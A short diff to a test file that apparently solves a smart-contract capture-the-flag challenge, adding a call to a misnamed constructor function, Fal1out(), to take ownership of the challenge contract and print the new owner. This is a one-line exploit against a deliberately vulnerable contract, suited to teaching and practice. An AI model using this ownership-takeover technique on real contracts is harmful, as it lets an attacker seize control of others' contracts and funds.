@@ -20,6 +20,10 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  await challenge.connect(eoa).Fal1out()
+  console.log(await challenge.owner())
+
 });
 
 after(async () => {
